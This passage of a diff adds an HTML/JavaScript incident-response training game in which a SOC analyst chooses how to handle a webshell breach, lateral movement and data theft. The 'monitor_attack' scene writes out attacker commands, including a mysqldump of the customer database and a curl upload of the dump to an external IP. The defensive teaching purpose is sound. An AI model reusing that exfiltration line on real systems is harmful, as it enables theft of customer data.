@@ -1,0 +1,1346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>--incident v2.1 - Incident Response Framework</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0a;
+            color: #ffb000;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            height: 100vh;
+            position: relative;
+        }
+
+        /* CRT Scanline effect */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.15),
+                rgba(0, 0, 0, 0.15) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+            pointer-events: none;
+            z-index: 1000;
+            animation: scanline 8s linear infinite;
+        }
+
+        @keyframes scanline {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(10px); }
+        }
+
+        /* Screen flicker */
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.95; }
+        }
+
+        .terminal {
+            padding: 20px;
+            height: 100vh;
+            overflow-y: auto;
+            position: relative;
+            animation: flicker 0.15s infinite;
+        }
+
+        .terminal::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .terminal::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+
+        .terminal::-webkit-scrollbar-thumb {
+            background: #ffb000;
+        }
+
+        /* Alert flash overlay */
+        .alert-flash {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(239, 68, 68, 0.3);
+            pointer-events: none;
+            opacity: 0;
+            z-index: 999;
+        }
+
+        .alert-flash.active {
+            animation: flash 0.5s ease-out;
+        }
+
+        @keyframes flash {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 1; }
+        }
+
+        /* Typography */
+        .header {
+            color: #ef4444;
+            margin-bottom: 20px;
+            white-space: pre;
+            font-size: 12px;
+            line-height: 1.2;
+        }
+
+        .prompt {
+            color: #ffb000;
+            margin-top: 10px;
+        }
+
+        .cursor {
+            display: inline-block;
+            width: 8px;
+            height: 16px;
+            background: #ffb000;
+            animation: blink 1s step-end infinite;
+            margin-left: 2px;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
+        .text-line {
+            margin: 5px 0;
+            white-space: pre-wrap;
+        }
+
+        .alert-text {
+            color: #ef4444;
+            font-weight: bold;
+        }
+
+        .warning-text {
+            color: #fbbf24;
+        }
+
+        .success-text {
+            color: #10b981;
+        }
+
+        .system-text {
+            color: #8b8b8b;
+        }
+
+        /* Buttons/Choices */
+        .choices {
+            margin: 15px 0;
+            padding-left: 20px;
+        }
+
+        .choice-btn {
+            display: block;
+            background: transparent;
+            border: 1px solid #ffb000;
+            color: #ffb000;
+            padding: 8px 15px;
+            margin: 8px 0;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            text-align: left;
+            transition: all 0.2s;
+        }
+
+        .choice-btn:hover {
+            background: #ffb000;
+            color: #0a0a0a;
+            border-color: #ffb000;
+        }
+
+        .choice-btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        /* Threat Meter */
+        .threat-meter {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(10, 10, 10, 0.9);
+            border: 1px solid #ef4444;
+            padding: 10px;
+            font-size: 12px;
+            z-index: 100;
+        }
+
+        .threat-bar {
+            width: 200px;
+            height: 20px;
+            border: 1px solid #ef4444;
+            margin-top: 5px;
+            position: relative;
+        }
+
+        .threat-fill {
+            height: 100%;
+            background: #ef4444;
+            transition: width 0.5s;
+        }
+
+        /* Timer */
+        .timer {
+            position: fixed;
+            top: 100px;
+            right: 20px;
+            background: rgba(10, 10, 10, 0.9);
+            border: 1px solid #fbbf24;
+            padding: 10px;
+            font-size: 18px;
+            z-index: 100;
+            display: none;
+        }
+
+        .timer.active {
+            display: block;
+        }
+
+        .timer.urgent {
+            border-color: #ef4444;
+            color: #ef4444;
+            animation: pulse 0.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        /* SIEM Background */
+        .siem-background {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 150px;
+            background: rgba(10, 10, 10, 0.8);
+            border-top: 1px solid #8b8b8b;
+            overflow: hidden;
+            font-size: 10px;
+            padding: 5px;
+            z-index: 50;
+            opacity: 0.6;
+        }
+
+        .siem-log {
+            color: #8b8b8b;
+            white-space: nowrap;
+        }
+
+        /* Back Link */
+        .back-link {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            color: #ef4444;
+            cursor: pointer;
+            text-decoration: none;
+            border: 1px solid #ef4444;
+            padding: 5px 10px;
+            z-index: 100;
+            transition: all 0.2s;
+        }
+
+        .back-link:hover {
+            background: #ef4444;
+            color: #0a0a0a;
+        }
+
+        /* Loading animation */
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
+
+        .loading::after {
+            content: '.';
+            animation: dots 1.5s infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="alert-flash" id="alertFlash"></div>
+
+    <a class="back-link" onclick="history.back()">← Back to Shield House</a>
+
+    <div class="threat-meter">
+        <div>THREAT LEVEL: <span id="threatLevel">25</span>%</div>
+        <div class="threat-bar">
+            <div class="threat-fill" id="threatFill" style="width: 25%"></div>
+        </div>
+    </div>
+
+    <div class="timer" id="timer">
+        TIME: <span id="timerValue">20</span>s
+    </div>
+
+    <div class="terminal" id="terminal">
+        <div class="header">
+ ___                _     _            _
+|_ _|_ __   ___ ___| | __| | ___ _ __ | |_
+ | || '_ \ / __/ __| |/ _` |/ _ \ '_ \| __|
+ | || | | | (__\__ \ | (_| |  __/ | | | |_
+|___|_| |_|\___|___/_|\__,_|\___|_| |_|\__|
+
+--incident v2.1 - Incident Response Framework
+Hexworth Prime - Shield House Training Simulation
+═══════════════════════════════════════════
+        </div>
+        <div id="output"></div>
+        <div class="prompt">
+            <span id="promptText">SOC-ANALYST@siem:~$</span><span class="cursor"></span>
+        </div>
+    </div>
+
+    <div class="siem-background" id="siemBackground"></div>
+
+    <script>
+        // ========================
+        // Web Audio API - Sound System
+        // ========================
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        const audioCtx = new AudioContext();
+        let ambientNode = null;
+
+        function playTypewriterClick() {
+            const oscillator = audioCtx.createOscillator();
+            const gainNode = audioCtx.createGain();
+
+            oscillator.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
+
+            oscillator.frequency.value = 800;
+            gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.05);
+
+            oscillator.start(audioCtx.currentTime);
+            oscillator.stop(audioCtx.currentTime + 0.05);
+        }
+
+        function playAlertKlaxon() {
+            const oscillator1 = audioCtx.createOscillator();
+            const oscillator2 = audioCtx.createOscillator();
+            const gainNode = audioCtx.createGain();
+
+            oscillator1.connect(gainNode);
+            oscillator2.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
+
+            oscillator1.frequency.value = 800;
+            oscillator2.frequency.value = 600;
+            gainNode.gain.setValueAtTime(0.2, audioCtx.currentTime);
+
+            oscillator1.start(audioCtx.currentTime);
+            oscillator2.start(audioCtx.currentTime + 0.2);
+            oscillator1.stop(audioCtx.currentTime + 0.2);
+            oscillator2.stop(audioCtx.currentTime + 0.4);
+        }
+
+        function playHeartbeat(bpm = 80) {
+            const oscillator = audioCtx.createOscillator();
+            const gainNode = audioCtx.createGain();
+
+            oscillator.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
+
+            oscillator.frequency.value = 60;
+            oscillator.type = 'sine';
+
+            gainNode.gain.setValueAtTime(0, audioCtx.currentTime);
+            gainNode.gain.linearRampToValueAtTime(0.3, audioCtx.currentTime + 0.05);
+            gainNode.gain.linearRampToValueAtTime(0, audioCtx.currentTime + 0.15);
+
+            oscillator.start(audioCtx.currentTime);
+            oscillator.stop(audioCtx.currentTime + 0.15);
+        }
+
+        function startAmbientDrone() {
+            if (ambientNode) return;
+
+            const oscillator = audioCtx.createOscillator();
+            const gainNode = audioCtx.createGain();
+            const filter = audioCtx.createBiquadFilter();
+
+            oscillator.connect(filter);
+            filter.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
+
+            oscillator.frequency.value = 80;
+            oscillator.type = 'sawtooth';
+            filter.frequency.value = 200;
+            gainNode.gain.value = 0.05;
+
+            oscillator.start();
+            ambientNode = oscillator;
+        }
+
+        function stopAmbientDrone() {
+            if (ambientNode) {
+                ambientNode.stop();
+                ambientNode = null;
+            }
+        }
+
+        function playSuccessFanfare() {
+            const notes = [261.63, 329.63, 392.00, 523.25]; // C, E, G, C
+            notes.forEach((freq, i) => {
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+
+                oscillator.frequency.value = freq;
+                gainNode.gain.setValueAtTime(0.2, audioCtx.currentTime + i * 0.15);
+                gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + i * 0.15 + 0.3);
+
+                oscillator.start(audioCtx.currentTime + i * 0.15);
+                oscillator.stop(audioCtx.currentTime + i * 0.15 + 0.3);
+            });
+        }
+
+        // ========================
+        // Game State
+        // ========================
+        let gameState = {
+            threatLevel: 25,
+            currentNode: 'start',
+            choices: [],
+            timerActive: false,
+            timerValue: 20,
+            timerInterval: null,
+            heartbeatInterval: null,
+            evidencePreserved: false,
+            lateralMovementStopped: false,
+            dataExfiltrated: false,
+            csuiteCalm: false
+        };
+
+        // ========================
+        // Story Nodes
+        // ========================
+        const storyNodes = {
+            start: {
+                text: `[23:47:12] INITIALIZING SHIFT...
+[23:47:13] LOGIN: analyst_j_chen
+[23:47:14] SIEM DASHBOARD LOADED
+[23:47:15] ACTIVE ALERTS: 3 (Low Priority)
+
+You settle into your chair with a fresh cup of coffee. Night shift at the SOC is usually quiet.
+You're reviewing the day's incidents when suddenly...
+
+[23:48:01] ▼▼▼ CRITICAL ALERT ▼▼▼
+[23:48:01] MULTIPLE HIGH-SEVERITY EVENTS DETECTED
+[23:48:02] SOURCE: WEB-DMZ-PROD-02
+[23:48:02] ALERT COUNT: 47 AND RISING
+[23:48:03] PATTERN: SUSPECTED WEBSHELL ACTIVITY
+
+Your screen floods with red. Every SIEM panel is lighting up.
+
+What do you do?`,
+                choices: [
+                    { text: '[1] Immediately escalate to Incident Commander', next: 'escalate_early' },
+                    { text: '[2] Investigate alerts to confirm true positive', next: 'investigate_initial', threat: 0 },
+                    { text: '[3] Isolate the affected server from network', next: 'isolate_premature', threat: 5 },
+                    { text: '[4] Check if other systems are affected', next: 'check_scope', threat: 5 }
+                ],
+                timed: true,
+                timerDuration: 20
+            },
+
+            investigate_initial: {
+                text: `[23:48:45] ANALYZING ALERT DETAILS...
+[23:48:46] SOURCE IP: 185.220.101.47 (TOR EXIT NODE)
+[23:48:47] TARGET: /admin/fileupload.php
+[23:48:48] PAYLOAD DETECTED: PHP WEBSHELL
+[23:48:49] STATUS: ▲ CONFIRMED COMPROMISE ▲
+
+[23:48:52] NEW ALERT: Outbound connection to 45.142.212.61:4444
+[23:48:53] PROTOCOL: ENCRYPTED REVERSE SHELL
+[23:48:54] DATA TRANSFER: 2.3 MB/s OUTBOUND
+
+This is real. You have an active breach with command and control established.
+
+[23:49:01] ** PHONE RINGING **
+[23:49:02] CALLER: VP of Engineering
+[23:49:03] "Why is the web server offline? We have customers complaining!"
+
+The phone keeps ringing. You need to act fast.`,
+                choices: [
+                    { text: '[1] Answer phone and explain situation', next: 'answer_phone', threat: 10 },
+                    { text: '[2] Block C2 server at firewall immediately', next: 'block_c2', threat: -5 },
+                    { text: '[3] Capture network traffic before containment', next: 'capture_traffic', threat: 5 },
+                    { text: '[4] Initiate full incident response protocol', next: 'ir_protocol', threat: 0 }
+                ],
+                timed: true,
+                timerDuration: 15
+            },
+
+            capture_traffic: {
+                text: `[23:49:30] INITIATING PACKET CAPTURE...
+[23:49:31] tcpdump -i eth0 -w /forensics/capture_$(date +%s).pcap
+[23:49:32] CAPTURE ACTIVE - 15,847 packets captured
+[23:49:35] EVIDENCE PRESERVATION: ENABLED
+
+Smart move. You're capturing evidence while the attacker is still active.
+
+[23:49:40] ▼ CRITICAL - NEW DETECTION ▼
+[23:49:41] LATERAL MOVEMENT DETECTED
+[23:49:42] SOURCE: WEB-DMZ-PROD-02
+[23:49:43] TARGET: DB-MASTER-01 (10.10.20.15)
+[23:49:44] METHOD: SSH BRUTE FORCE (1,847 attempts/sec)
+[23:49:45] STATUS: 3 FAILED ATTEMPTS ON ADMIN ACCOUNT
+
+The attacker is trying to move deeper into your network.
+
+[23:49:47] ** PHONE STILL RINGING **
+[23:49:48] NOW: CEO calling your manager`,
+                choices: [
+                    { text: '[1] Block WEB-DMZ-PROD-02 at internal firewall', next: 'block_lateral', threat: -10 },
+                    { text: '[2] Disable admin account on DB server', next: 'disable_account', threat: -5 },
+                    { text: '[3] Monitor the attack to learn TTPs', next: 'monitor_attack', threat: 15 },
+                    { text: '[4] Shut down DB server preventatively', next: 'shutdown_db', threat: 5 }
+                ],
+                timed: true,
+                timerDuration: 12
+            },
+
+            block_lateral: {
+                text: `[23:50:15] EXECUTING FIREWALL RULE...
+[23:50:16] iptables -I FORWARD -s 10.10.10.47 -j DROP
+[23:50:17] RULE APPLIED - WEB-DMZ-PROD-02 ISOLATED
+[23:50:18] ✓ LATERAL MOVEMENT BLOCKED
+
+[23:50:22] C2 CONNECTION SEVERED
+[23:50:23] ATTACKER SHELL: TERMINATED
+
+Good work. You've contained the immediate threat. But now the real work begins.
+
+[23:50:30] YOUR MANAGER APPEARS AT YOUR DESK
+[23:50:31] "What's the situation? CEO is freaking out."
+
+[23:50:35] CURRENT STATUS:
+[23:50:36] • Webshell identified and isolated
+[23:50:37] • Lateral movement prevented
+[23:50:38] • Evidence captured
+[23:50:39] • Production web server offline
+[23:50:40] • Customer impact: HIGH
+
+You need to provide a brief and decide next steps.`,
+                choices: [
+                    { text: '[1] "Breach contained. Begin forensics and remediation."', next: 'begin_forensics', threat: -5 },
+                    { text: '[2] "Need to check for data exfiltration first."', next: 'check_exfil', threat: 0 },
+                    { text: '[3] "Bring server back online after patching."', next: 'premature_restore', threat: 20 },
+                    { text: '[4] "Recommend external IR firm engagement."', next: 'external_ir', threat: -10 }
+                ],
+                timed: false
+            },
+
+            check_exfil: {
+                text: `[23:52:15] ANALYZING NETFLOW DATA...
+[23:52:16] QUERYING DATA LOSS PREVENTION LOGS...
+[23:52:18] REVIEWING FIREWALL EGRESS TRAFFIC...
+[23:52:20] PROCESSING...
+
+[23:52:45] ▼ ANALYSIS COMPLETE ▼
+[23:52:46]
+[23:52:47] SUSPICIOUS OUTBOUND TRANSFERS DETECTED:
+[23:52:48] • 23:41:30 - 127.4 MB to 45.142.212.61
+[23:52:49] • 23:44:15 - 89.2 MB to 45.142.212.61
+[23:52:50] • 23:47:58 - 243.8 MB to 45.142.212.61
+[23:52:51]
+[23:52:52] TOTAL DATA TRANSFERRED: 460.4 MB
+[23:52:53] TIME WINDOW: 23:41 - 23:48 (7 minutes before detection)
+[23:52:54]
+[23:52:55] ▲ CONCLUSION: DATA EXFILTRATION CONFIRMED ▲
+
+Your stomach drops. The attacker was in your system for at least 7 minutes before you detected them.
+
+[23:53:01] MANAGER: "What data was taken?"
+[23:53:02]
+[23:53:03] You need to identify what was stolen.`,
+                choices: [
+                    { text: '[1] Query web server logs for accessed files', next: 'check_logs', threat: 0 },
+                    { text: '[2] Contact DBA to check database access', next: 'contact_dba', threat: 5 },
+                    { text: '[3] Review application source code location', next: 'check_source', threat: 0 },
+                    { text: '[4] Assume worst case - customer PII compromised', next: 'assume_breach', threat: 5 }
+                ],
+                timed: false
+            },
+
+            check_logs: {
+                text: `[23:54:20] PARSING WEB SERVER LOGS...
+[23:54:21] grep "23:4[1-8]" /var/log/apache2/access.log
+[23:54:22]
+[23:54:23] 185.220.101.47 - - [10/Feb/2026:23:41:47] "POST /admin/fileupload.php"
+[23:54:24] 185.220.101.47 - - [10/Feb/2026:23:42:12] "GET /config/database.php"
+[23:54:25] 185.220.101.47 - - [10/Feb/2026:23:42:45] "GET /backups/customers_2026-02-09.sql.gz"
+[23:54:26] 185.220.101.47 - - [10/Feb/2026:23:44:03] "GET /backups/customers_2026-02-08.sql.gz"
+[23:54:27] 185.220.101.47 - - [10/Feb/2026:23:46:38] "GET /private/api_keys.json"
+[23:54:28]
+[23:54:30] ▼▼▼ CRITICAL FINDING ▼▼▼
+[23:54:31] CUSTOMER DATABASE BACKUPS ACCESSED
+[23:54:32] FILES CONTAIN: Names, Emails, Phone Numbers, Addresses
+[23:54:33] RECORDS: ~125,000 customer accounts
+[23:54:34]
+[23:54:35] ▲ THIS IS A DATA BREACH ▲
+
+[23:54:40] MANAGER: "Oh no. This means..."
+[23:54:41] YOU: "Breach notification. Legal. PR. The whole incident response plan."
+[23:54:42]
+[23:54:45] ** PHONE RINGS - CEO **
+[23:54:46] MANAGER: "I'll take this. You focus on containment and evidence."
+
+This just became a major incident. Your next moves will determine if this company survives the breach.`,
+                choices: [
+                    { text: '[1] Image compromised server for forensics', next: 'forensic_image', threat: -10 },
+                    { text: '[2] Check for persistence mechanisms', next: 'check_persistence', threat: -5 },
+                    { text: '[3] Scan entire network for compromise', next: 'network_scan', threat: -5 },
+                    { text: '[4] Document timeline and indicators', next: 'document_timeline', threat: 0 }
+                ],
+                timed: false
+            },
+
+            forensic_image: {
+                text: `[23:56:30] CREATING FORENSIC IMAGE...
+[23:56:31] dd if=/dev/sda of=/forensics/web-dmz-prod-02_$(date +%s).img bs=4M
+[23:56:35] IMAGING IN PROGRESS...
+[23:56:40] ████████░░░░░░░░░░ 40%
+[23:57:10] ████████████████░░ 80%
+[23:57:35] ██████████████████ 100%
+[23:57:36]
+[23:57:37] ✓ FORENSIC IMAGE COMPLETE
+[23:57:38] SHA256: a3f5c9e2b1d8...
+[23:57:39] SIZE: 80 GB
+[23:57:40] CHAIN OF CUSTODY: PRESERVED
+[23:57:41]
+[23:57:42] Evidence is secured. This will be critical for:
+[23:57:43] • Root cause analysis
+[23:57:44] • Legal proceedings
+[23:57:45] • Insurance claims
+[23:57:46] • Regulatory reporting
+
+[23:58:00] Your manager returns: "Legal team is activated. We need a full incident report."
+
+[23:58:05] You've done excellent work under pressure. Now it's time to close this out.`,
+                choices: [
+                    { text: '[1] Rebuild server from clean backup', next: 'rebuild_server', threat: -10 },
+                    { text: '[2] Conduct lessons learned session', next: 'lessons_learned', threat: 0 },
+                    { text: '[3] File threat intelligence report', next: 'threat_intel', threat: -5 },
+                    { text: '[4] Complete incident documentation', next: 'ending_contained', threat: 0 }
+                ],
+                timed: false
+            },
+
+            ending_contained: {
+                text: `
+[02:34:18] ═══════════════════════════════════════════
+[02:34:19] INCIDENT RESPONSE COMPLETE
+[02:34:20] ═══════════════════════════════════════════
+[02:34:21]
+[02:34:22] FINAL INCIDENT REPORT
+[02:34:23] ----------------------
+[02:34:24]
+[02:34:25] DETECTION TIME: 23:48:01
+[02:34:26] CONTAINMENT TIME: 23:50:17
+[02:34:27] RESPONSE DURATION: 2 minutes 16 seconds
+[02:34:28]
+[02:34:29] IMPACT ASSESSMENT:
+[02:34:30] ✓ Breach detected and contained rapidly
+[02:34:31] ✓ Lateral movement prevented
+[02:34:32] ✓ Forensic evidence preserved
+[02:34:33] ✗ 460.4 MB customer data exfiltrated
+[02:34:34] ✓ No additional systems compromised
+[02:34:35]
+[02:34:36] THREAT ACTOR PROFILE:
+[02:34:37] • Sophisticated attacker
+[02:34:38] • Exploited unpatched file upload vulnerability
+[02:34:39] • Moved quickly to high-value targets
+[02:34:40] • Used TOR and encrypted C2
+[02:34:41]
+[02:34:42] RECOMMENDATIONS:
+[02:34:43] • Patch CVE-2026-XXXXX immediately on all systems
+[02:34:44] • Implement web application firewall rules
+[02:34:45] • Disable unnecessary file upload functions
+[02:34:46] • Rotate all API keys and credentials
+[02:34:47] • Engage breach notification counsel
+[02:34:48]
+[02:34:49] ═══════════════════════════════════════════
+[02:34:50] ENDING: PROFESSIONAL RESPONSE
+[02:34:51] ═══════════════════════════════════════════
+[02:34:52]
+[02:34:53] Despite the data breach, your quick thinking and methodical
+[02:34:54] approach prevented a catastrophic compromise. Evidence was
+[02:34:55] preserved, the attacker was ejected, and the company can now
+[02:34:56] move forward with notification and remediation.
+[02:34:57]
+[02:34:58] The CEO sends a company-wide email praising the SOC team's
+[02:34:59] rapid response. You're exhausted, but you did your job well.
+[02:35:00]
+[02:35:01] THREAT LEVEL: 45% (Moderate)
+[02:35:02]
+[02:35:03] ✓ ACHIEVEMENT UNLOCKED: Incident Responder
+[02:35:04] ✓ XP AWARDED: +50
+
+[GAME OVER - Press R to restart]`,
+                choices: [],
+                ending: true,
+                endingType: 'partial'
+            },
+
+            escalate_early: {
+                text: `[23:48:35] ESCALATING TO INCIDENT COMMANDER...
+[23:48:36] PAGING ON-CALL IC...
+[23:48:45] NO RESPONSE
+[23:48:50] SENDING BACKUP PAGE...
+[23:49:05] NO RESPONSE
+
+[23:49:10] ▼ ALERT ESCALATION ▼
+[23:49:11] ALERT COUNT NOW: 89
+[23:49:12] NEW SOURCE: DB-MASTER-01
+[23:49:13] ATTACKER ACTIVITY: LATERAL MOVEMENT IN PROGRESS
+
+While you waited for escalation, the attacker moved deeper into your network.
+
+[23:49:20] YOUR MANAGER CALLS:
+[23:49:21] "Why didn't you take action? You're the first responder!"
+
+You realize you wasted precious time on a night when you had to act.`,
+                choices: [
+                    { text: '[1] Take immediate action now', next: 'investigate_initial', threat: 15 },
+                    { text: '[2] Continue trying to reach IC', next: 'continue_escalate', threat: 25 }
+                ],
+                timed: true,
+                timerDuration: 10
+            },
+
+            isolate_premature: {
+                text: `[23:48:40] ISOLATING SERVER...
+[23:48:41] iptables -I INPUT -j DROP
+[23:48:42] ✓ WEB-DMZ-PROD-02 ISOLATED
+
+[23:48:45] ▼ PROBLEM ▼
+[23:48:46] All active C2 connections severed
+[23:48:47] No packet capture obtained
+[23:48:48] No evidence of attacker activity preserved
+[23:48:49] No visibility into what was accessed
+
+[23:48:55] YOUR MANAGER:
+[23:48:56] "You just killed our ability to understand this breach.
+[23:48:57] We don't know what they took or how they got in."
+
+Premature isolation without evidence collection was a critical mistake.`,
+                choices: [
+                    { text: '[1] Bring server back online to monitor', next: 'restore_for_monitoring', threat: 30 },
+                    { text: '[2] Begin forensics on offline system', next: 'offline_forensics', threat: 10 },
+                    { text: '[3] Check other systems for compromise', next: 'check_scope', threat: 5 }
+                ],
+                timed: false
+            },
+
+            check_scope: {
+                text: `[23:49:15] SCANNING NETWORK FOR IOCs...
+[23:49:16] nmap -sV -p 4444,5555,8080,8443 10.10.0.0/16
+[23:49:20] SCANNING...
+
+[23:49:45] ▼ SCAN RESULTS ▼
+[23:49:46]
+[23:49:47] HOST: WEB-DMZ-PROD-02 (10.10.10.47)
+[23:49:48] PORT 4444/tcp OPEN - suspicious process
+[23:49:49]
+[23:49:50] HOST: DB-MASTER-01 (10.10.20.15)
+[23:49:51] PORT 5555/tcp OPEN - suspicious process
+[23:49:52]
+[23:49:53] ▲ MULTIPLE SYSTEMS COMPROMISED ▲
+
+This is worse than you thought. The attacker has established persistence on multiple critical systems.
+
+[23:49:58] ** ALERT STORM **
+[23:49:59] Data staging detected on DB-MASTER-01
+[23:50:00] Large file transfer in progress: 1.2 GB
+[23:50:01] Destination: 45.142.212.61`,
+                choices: [
+                    { text: '[1] Block outbound traffic immediately', next: 'emergency_block', threat: -5 },
+                    { text: '[2] Isolate both compromised systems', next: 'isolate_multiple', threat: 0 },
+                    { text: '[3] Capture the data transfer for analysis', next: 'capture_transfer', threat: 10 }
+                ],
+                timed: true,
+                timerDuration: 10
+            },
+
+            monitor_attack: {
+                text: `[23:50:05] MONITORING ATTACKER TTPs...
+[23:50:06] Observing for threat intelligence...
+
+[23:50:30] ▼ ATTACKER ACTIVITY ▼
+[23:50:31] SSH LOGIN SUCCESSFUL: DB-MASTER-01
+[23:50:32] USERNAME: admin (brute forced)
+[23:50:35] COMMAND: mysqldump -u root -p customers > /tmp/dump.sql
+[23:50:40] COMMAND: gzip /tmp/dump.sql
+[23:50:45] COMMAND: curl -F "file=@/tmp/dump.sql.gz" 45.142.212.61/upload
+
+[23:50:50] ▼▼▼ CRITICAL ▼▼▼
+[23:50:51] ENTIRE CUSTOMER DATABASE EXFILTRATED
+[23:50:52] SIZE: 1.8 GB
+[23:50:53] RECORDS: 500,000+ customers
+[23:50:54] DATA: Full PII including payment information
+
+[23:50:58] YOUR MANAGER APPEARS:
+[23:50:59] "WHAT ARE YOU DOING?! WHY DIDN'T YOU STOP THEM?!"
+
+Your decision to "monitor" just caused a catastrophic data breach.`,
+                choices: [
+                    { text: '[1] Isolate everything now', next: 'panic_isolate', threat: 30 },
+                    { text: '[2] Try to explain your reasoning', next: 'ending_catastrophic', threat: 50 }
+                ],
+                timed: false
+            },
+
+            block_c2: {
+                text: `[23:49:25] BLOCKING C2 SERVER...
+[23:49:26] iptables -A OUTPUT -d 45.142.212.61 -j DROP
+[23:49:27] ✓ FIREWALL RULE APPLIED
+
+[23:49:30] C2 CONNECTION STATUS: BLOCKED
+[23:49:31] Attacker's reverse shell terminated
+
+[23:49:35] However, the webshell is still present on the server.
+[23:49:36] The attacker could establish a new C2 connection.
+
+[23:49:40] ▼ NEW ALERT ▼
+[23:49:41] Outbound connection attempt to 104.21.32.55:443
+[23:49:42] Attacker is trying backup C2 server!
+
+You need to capture evidence and fully contain this.`,
+                choices: [
+                    { text: '[1] Block all outbound from compromised server', next: 'full_egress_block', threat: -5 },
+                    { text: '[2] Start packet capture before blocking', next: 'capture_traffic', threat: 5 },
+                    { text: '[3] Remove webshell from server', next: 'remove_webshell', threat: 0 }
+                ],
+                timed: true,
+                timerDuration: 10
+            },
+
+            ir_protocol: {
+                text: `[23:49:35] INITIATING INCIDENT RESPONSE PROTOCOL...
+[23:49:36]
+[23:49:37] ✓ Activating incident response team
+[23:49:38] ✓ Starting evidence collection
+[23:49:39] ✓ Documenting timeline
+[23:49:40] ✓ Preserving logs
+[23:49:41]
+[23:49:45] You follow the playbook methodically:
+[23:49:46] 1. Contain the threat
+[23:49:47] 2. Preserve evidence
+[23:49:48] 3. Eradicate attacker presence
+[23:49:49] 4. Recover systems
+[23:49:50] 5. Document lessons learned
+
+[23:49:55] This is exactly what you trained for.
+
+Your systematic approach minimizes damage and ensures proper evidence handling.`,
+                choices: [
+                    { text: '[1] Continue with containment phase', next: 'capture_traffic', threat: -5 },
+                    { text: '[2] Execute network isolation procedure', next: 'block_lateral', threat: -10 }
+                ],
+                timed: false
+            },
+
+            answer_phone: {
+                text: `[23:49:15] You answer the phone...
+
+[23:49:16] VP OF ENGINEERING: "The web server is down! Customer orders are failing!
+[23:49:17] We're losing $50,000 per minute! Bring it back online NOW!"
+
+[23:49:20] YOU: "Sir, we have an active security breach-"
+
+[23:49:21] VP: "I don't care about security right now! REVENUE IS BLEEDING!"
+
+[23:49:25] While you argue, the attacker:
+[23:49:26] ✗ Completed lateral movement to database server
+[23:49:27] ✗ Exfiltrated 2.3 GB of customer data
+[23:49:28] ✗ Established persistent backdoor access
+
+Time wasted on politics cost you the incident.`,
+                choices: [
+                    { text: '[1] Hang up and respond to incident', next: 'late_response', threat: 25 },
+                    { text: '[2] Bring server online per VP request', next: 'ending_catastrophic', threat: 50 }
+                ],
+                timed: false
+            },
+
+            ending_catastrophic: {
+                text: `
+[00:15:34] ═══════════════════════════════════════════
+[00:15:35] INCIDENT RESPONSE FAILURE
+[00:15:36] ═══════════════════════════════════════════
+[00:15:37]
+[00:15:38] FINAL DAMAGE ASSESSMENT
+[00:15:39] -----------------------
+[00:15:40]
+[00:15:41] ✗ Multiple systems compromised
+[00:15:42] ✗ 500,000+ customer records stolen (complete PII)
+[00:15:43] ✗ Payment card data exfiltrated
+[00:15:44] ✗ Persistent backdoors installed
+[00:15:45] ✗ Little forensic evidence preserved
+[00:15:46] ✗ Attacker maintains access to environment
+[00:15:47]
+[00:15:48] BUSINESS IMPACT:
+[00:15:49] • $15M+ in breach notification costs
+[00:15:50] • $200M+ in regulatory fines (GDPR, CCPA)
+[00:15:51] • Class action lawsuit filed
+[00:15:52] • 40% stock price drop
+[00:15:53] • CISO and VP Engineering terminated
+[00:15:54]
+[00:15:55] ROOT CAUSE:
+[00:15:56] Critical delays and poor decision-making during
+[00:15:57] the initial response window allowed the attacker
+[00:15:58] to achieve their objectives completely.
+[00:15:59]
+[00:16:00] ═══════════════════════════════════════════
+[00:16:01] ENDING: CATASTROPHIC COMPROMISE
+[00:16:02] ═══════════════════════════════════════════
+[00:16:03]
+[00:16:04] Six months later, the company announces bankruptcy.
+[00:16:05] The breach was too costly to recover from.
+[00:16:06]
+[00:16:07] You find a new job, but the incident haunts you.
+[00:16:08] In security, seconds matter.
+[00:16:09]
+[00:16:10] THREAT LEVEL: 100% (Critical Failure)
+[00:16:11]
+[00:16:12] NO XP AWARDED
+
+[GAME OVER - Press R to restart]`,
+                choices: [],
+                ending: true,
+                endingType: 'catastrophic'
+            },
+
+            begin_forensics: {
+                text: `[23:51:00] BEGINNING FORENSIC ANALYSIS...
+[23:51:01]
+[23:51:05] Your methodical approach pays off:
